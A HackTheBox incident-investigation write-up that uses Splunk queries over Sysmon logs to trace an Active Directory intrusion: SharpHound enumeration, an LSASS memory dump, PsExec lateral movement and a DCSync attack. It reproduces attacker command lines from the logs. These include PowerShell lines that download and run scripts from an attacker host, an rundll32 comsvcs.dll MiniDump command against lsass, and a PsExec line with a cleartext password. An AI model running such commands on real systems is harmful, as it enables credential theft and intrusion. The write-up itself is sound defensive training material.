
# Overview

| Property | Value                        |
| -------- | ---------------------------- |
| Platform | HackTheBox                   |
| Type     | Investigation / Log Analysis |
| Date     | 2026.07.09                   |

---
## Step 1 - Set Investigation Time Range

Started with a full-history search to avoid missing events outside the default time window.

```spl
index="main" earliest=0
```

---
## Step 2 - Check log source types

```spl
index=main | stats count by sourcetype
```

**Result:**

| Sourcetype | Count |
| ---------- | ----- |
| WinEventLog:Application | 9196 |
| WinEventLog:Security | 68568 |
| WinEventLog:Sysmon | 358108 |
| WinEventLog:System | 8517 |
| linux:auth | 208 |

---
## Step 3 - Check sysmon logs

**Sysmon:** Sysmon (System Monitor) is a tool that provides detailed Windows diagnostic events that Windows does not log by default:
- Process creation with full command line
- Network connections with process name
- File creation
- Registry changes
- DLL loads
- and more...

Sysmon is essential for threat hunting and incident response.

```spl
index="main" sourcetype="WinEventLog:Sysmon"
```

---
## Step 4 - Identify Event Types Present

```spl
index="main" sourcetype="WinEventLog:Sysmon" 
|stats count by EventCode
```

**Result:**

| EventCode | Meaning                       | Count  |
| --------- | ----------------------------- | ------ |
| 1         | Process Creation              | 5427   |
| 2         | File Creation Time Changed    | 108    |
| 3         | Network Connection            | 1553   |
| 4         | Sysmon Service State Changed  | 75     |
| 5         | Process Terminated            | 1167   |
| 6         | Driver Loaded                 | 50     |
| 7         | Image/DLL Loaded              | 39486  |
| 8         | CreateRemoteThread            | 70     |
| 10        | Process Access                | 15714  |
| 11        | File Created                  | 104678 |
| 12        | Registry Object Added/Deleted | 64915  |
| 13        | Registry Value Set            | 60447  |
| 15        | File Stream Created (ADS)     | 462    |
| 16        | Sysmon Config Changed         | 30     |
| 17        | Pipe Created                  | 2620   |
| 18        | Pipe Connected                | 1339   |
| 22        | DNS Query                     | 4893   |
| 23        | File Deleted (Archived)       | 53403  |
| 25        | Process Tampering             | 46     |
| 255       | Sysmon Error (internal)       | 1625   |

**Most interesting EventCodes:**
- 1   - Process Creation - Useful for hunts targeting abnormal parent-child process hierarchies
- 10 - Process Access - Useful for spotting remote code injection and memory dumping
- 22 - DNS Query - Tracks DNS queries, which can be beneficial for monitoring DNS-based C2 beaconing.

---
## Step 5 - Search Abnormal Processes and Their Parents

```spl
index="main" sourcetype="WinEventLog:Sysmon" EventCode=1
|stats count by ParentImage, Image
```

**Result:**
These processes appear the most suspicious and will be examined in greater detail later in step 6 investigation. 

| ParentImage                             | Image                                                     | Count |
| --------------------------------------- | --------------------------------------------------------- | ----- |
| C:\Windows\System32\cmd.exe             | C:\Users\waldo\Downloads\SharpHound.exe                   | 1     |
| C:\Windows\System32\notepad.exe         | C:\Windows\System32\whoami.exe                            | 1     |
| \\10.0.0.47\C$\Windows\PSEXECSCVCS.exe  | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | 4     |
| \\10.0.0.47\C$\Windows\PSEXECSCVCS.exe  | C:\Windows\System32\rundll32.exe                          | 4     |
| C:\Windows\System32\notepad.exe         | C:\Windows\System32\cmd.exe                               | 11    |
| C:\Users\waldo\Downloads\randomfile.exe | C:\Windows\System32\cmd.exe                               | 20    |
| C:\Users\waldo\Downloads\randomfile.exe | C:\Windows\System32\rundll32.exe                          | 10    |

This step surfaced five anomalous parent-child pairs falling into three categories: 
- process injection/obfuscation via notepad.exe (Step 6),
- lateral-movement attempt via PsExec launched from randomfile.exe (culminating in the successful pivot documented in Step 6, Ad.4),
- confirmed remote code execution on the pivot target (10.0.0.47) via a renamed PsExec service binary.

---
## Step 6 - Investigate Processes Spawned by notepad.exe

As mentioned in Step 5, the first suspicious process selected for deeper investigation was **notepad.exe**.

```spl
index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 (Image="*cmd.exe" OR Image="*powershell.exe") ParentImage="C:\\Windows\\System32\\notepad.exe" 
| table _time, CommandLine 
| sort _time
```

**Result:**

**Ad.1 Reconnaissance**
- `2022-10-05 13:56:12` — `notepad.exe` spawned a process to run `whoami`

**Ad.2 SharpHound Enumeration**
- `2022-11-08 11:26:11` — The victim host connected to the attacker's server to download `SharpHound.exe`: `-C Invoke-WebRequest -Uri http://10.0.0.229:8080/SharpHound.exe -OutFile SharpHound.exe`
- `2022-11-08 11:26:32` — SharpHound was executed for Active Directory enumeration: `SharpHound -d uniwaldo.local`

**Ad.3 LSASS Memory Dump**
- `2022-11-08 11:45:32 - 11:46:07` — `rundll32.exe` executed `comsvcs.dll` to dump the memory of the `lsass.exe` process (PID 640):
  `C:\Windows\System32\comsvcs.dll,MiniDump 640 C:\Users\waldo\Downloads\file.dmp`
  `C:\Windows\System32\comsvcs.dll,MiniDump 640 C:\Users\waldo\Downloads\file.dmp full`

**Ad.4 Lateral Movement - PsExec with Stolen Credentials**
- `2022-11-08 11:49:35` — `psexec64.exe` was used with compromised credentials (`UNIWALDO\Waldo`) to move laterally to `10.0.0.47` and deliver `comsvcs.dll`:
  `psexec64.exe -accepteula -u UNIWALDO\Waldo -p Password@123 \\10.0.0.47 "powershell Invoke-WebRequest -Uri http://10.0.0.229:8080/comsvcs.dll -OutFile C:\comsvcs.dll"`



**Raw Output:**

| _time               | CommandLine                                                                                                                                                                                          |
| ------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 2022-10-05 13:56:12 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -C whoami                                                                                                                                  |
| 2022-11-08 11:26:11 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -C Invoke-WebRequest -Uri http://10.0.0.229:8080/SharpHound.exe -OutFile SharpHound.exe                                                    |
| 2022-11-08 11:26:32 | c:\windows\system32\cmd.exe /c SharpHound -d uniwaldo.local                                                                                                                                          |
| 2022-11-08 11:34:35 | c:\windows\system32\cmd.exe /c nslookup DESKTOP-UN7T4R8                                                                                                                                              |
| 2022-11-08 11:34:41 | c:\windows\system32\cmd.exe /c nslookup DESKTOP-UN7T4R8.uniwaldo.local                                                                                                                               |
| 2022-11-08 11:35:24 | c:\windows\system32\cmd.exe /c nslookup 10.0.0.47                                                                                                                                                    |
| 2022-11-08 11:35:44 | c:\windows\system32\cmd.exe /c dir \\10.0.0.47\c$                                                                                                                                                    |
| 2022-11-08 11:39:00 | c:\windows\system32\cmd.exe /c ping 10.0.0.47                                                                                                                                                        |
| 2022-11-08 11:45:32 | c:\windows\system32\cmd.exe /c rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump 640 C:\Users\waldo\Downloads\file.dmp                                                                           |
| 2022-11-08 11:46:07 | c:\windows\system32\cmd.exe /c rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump 640 C:\Users\waldo\Downloads\file.dmp full                                                                      |
| 2022-11-08 11:49:35 | c:\windows\system32\cmd.exe /c psexec64.exe -accepteula -u UNIWALDO\Waldo -p Password@123 \\10.0.0.47 "powershell Invoke-WebRequest -Uri http://10.0.0.229:8080/comsvcs.dll -OutFile C:\comsvcs.dll" |
| 2022-11-08 11:51:34 | c:\windows\system32\cmd.exe /c psexec64.exe -accepteula -u UNIWALDO\waldo -p Password@123 \\127.0.0.1 whoami                                                                                         |
| 2022-11-08 12:22:01 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -C Invoke-WebRequest -Uri http://10.0.0.229:8080/file.exe -OutFile file.exe                                                                |

**MITRE ATT&CK Mapping:**

| Ad. | Finding | Technique |
| --- | --- | --- |
| Ad.1 | `whoami` | T1033 – System Owner/User Discovery |
| Ad.2 | SharpHound enumeration | T1482 – Domain Trust Discovery / T1087.002 – Account Discovery: Domain Account |
| Ad.3 | LSASS memory dump via `comsvcs.dll` | T1003.001 – OS Credential Dumping: LSASS Memory |
| Ad.4 | PsExec lateral movement with stolen credentials | T1021.002 – Remote Services: SMB/Windows Admin Shares |
| (all) | `notepad.exe` as common parent process | T1036 – Masquerading (hypothesis, to be confirmed) |

---
## Step 7 - Check Suspicious IP Address in Linux Logs

**Ad.1 Check sourcetype**

```spl
index="main" 10.0.0.229 | stats count by sourcetype

```

**Result:**
- linux:syslog
- WinEventLog:Sysmon

**Ad.2 Check linux syslog logs**

```spl
index="main" 10.0.0.229 sourcetype="linux:syslog"
```

**Result:**

```
11/8/22
3:53:13.000 PM	
Nov  8 15:53:13 waldo-virtual-machine avahi-daemon[875]: Leaving mDNS multicast group on interface ens160.IPv4 with address 10.0.0.229.

    host = waldo-virtual-machine
    source = LinuxSyslog_waldo-virtual-machine.txt
    sourcetype = linux:syslog

```

The result confirms that the attack was made from a Linux machine with IP address 10.0.0.229

**Ad.3 Check windows sysmon logs**

```spl
index="main" 10.0.0.229  sourcetype="wineventlog:sysmon" 
| stats count by EventCode
```

**Result:**

| EventCode | count |
| --------- | ----- |
| 1         | 10    |
| 3         | 45    |
| 15        | 18    |

---
## Step 8 - Check Suspicious IP In Windows Log - DCSync Attack

```spl
index="main" 10.0.0.229  sourcetype="wineventlog:sysmon" 
| stats count by _time, CommandLine
```

**Result:**

| _time               | CommandLine                                                                                                                                           |
| ------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------- |
| 2022-11-08 12:09:59 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -C iex(new-Object Net.WebClient).DownloadString('http://10.0.0.229:8080/Invoke-DCSync.ps1') |
| 2022-11-08 12:11:36 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -C iex(new-Object Net.WebClient).DownloadString('http://10.0.0.229:8080/Invoke-DCSync.ps1') |
| 2022-11-08 12:11:52 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -C iex(new-Object Net.WebClient).DownloadString('http://10.0.0.229:8080/Invoke-DCSync.ps1') |
| 2022-11-08 12:12:46 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -C iex(new-Object Net.WebClient).DownloadString('http://10.0.0.229:8080/Invoke-DCSync.ps1') |

---

## Step 9 - DCSync Attack Validation by Event 4662

```spl
index="main" EventCode=4662 Account_Name!=*$ Access_Mask=0x100
```

**Result:**
- Account Name: Waldo
- Keywords: Audit Success
- Control Access:
  - {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} - DS-Replication-Get-Changes
  - {19195a5b-6da0-11d0-afd3-00c04fd930c9} - DS-Replication-Get-Changes-All

**Conclusion:**
This confirms the attacker's account (`Waldo`) already held Active Directory replication rights (`DS-Replication-Get-Changes`/`-All`) and successfully abused them to perform a DCSync attack, extracting replicated AD credential data.

---
## Step 10 - Check LSASS Memory Dumping

```spl
index="main" EventCode=10 lsass 
| stats count by SourceImage
```

**Result:**
- C:\Windows\system32\rundll32.exe
- C:\Windows\System32\notepad.exe

```spl
index="main" EventCode=10 lsass SourceImage="C:\\Windows\\System32\\notepad.exe"
```

**Result:**
 - GrantedAccess: 0x1FFFFF
		 - corresponds to `PROCESS_ALL_ACCESS` in the Windows API, granting a source process every possible access right to a target process. Is a strong indicator of credential dumping, debugging, or process injection
		 
 - CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9d4c4|UNKNOWN(00000288CF8F5445)
		 - indicates that the memory address  invoking the function , does not  map to  any known, legitimate file on disk, which often suggests process injection or memory execution.
		 
- RuleName: technique_id=T1003, technique_name=Credential Dumping
- SourceImage: C:\Windows\System32\notepad.exe (PID 7736)
- TargetImage: C:\Windows\system32\lsass.exe (PID 640)
- SourceUser: DESKTOP-EGSS5IS\waldo


**Check if notepad.exe created any file between   11/08/2022:11:44:00 to 11/08/2022:11:46:00**

```spl
index="main" EventCode=11 notepad.exe earliest="11/08/2022:11:44:00" latest="11/08/2022:11:46:00"
```

**Conclusion**
This evidence shows a process injection attack (MITRE T1055) used to steal credentials from LSASS memory (MITRE T1003.001). The attacker used masquerading (MITRE T1036): the process looks like the real notepad.exe, but its CallTrace ends in UNKNOWN — meaning the code that touched lsass.exe was not really part of notepad.exe. This proves the process was hijacked.
Notepad.exe asked for full access (GrantedAccess: 0x1FFFFF) to lsass.exe. But unlike Step 6's rundll32.exe/comsvcs.dll dump, no file was created here. This means the attacker read the memory directly, without saving a file to disk.

---
# MITRE ATT&CK Technique Mapping


| Step | Finding                                                  | Technique                                                                                  |
| ---- | --------------------------------------------------------- | ------------------------------------------------------------------------------------------ |
| 6    | `whoami` executed                                        | T1033 – System Owner/User Discovery                                                        |
| 6    | SharpHound AD enumeration                                | T1087.002 – Account Discovery: Domain Account / T1482 – Domain Trust Discovery             |
| 6    | LSASS memory dump via `comsvcs.dll`                      | T1003.001 – OS Credential Dumping: LSASS Memory                                            |
| 6    | Lateral movement - PsExec with stolen credentials        | T1021.002 – Remote Services: SMB/Windows Admin Shares                                      |
| 8    | Downloaded and executed `Invoke-DCSync.ps1` via PowerShell | T1059.001 – Command and Scripting Interpreter: PowerShell / T1105 – Ingress Tool Transfer |
| 9    | DCSync replication abuse confirmed via Event 4662        | T1003.006 – OS Credential Dumping: DCSync                                                  |
| 10   | `notepad.exe` injected with code reaching into `lsass.exe` | T1055 – Process Injection                                                                 |
| 10   | Fileless LSASS memory read (no file created)             | T1003.001 – OS Credential Dumping: LSASS Memory                                            |
| 10   | `notepad.exe` used to hide malicious activity            | T1036 – Masquerading                                                                        |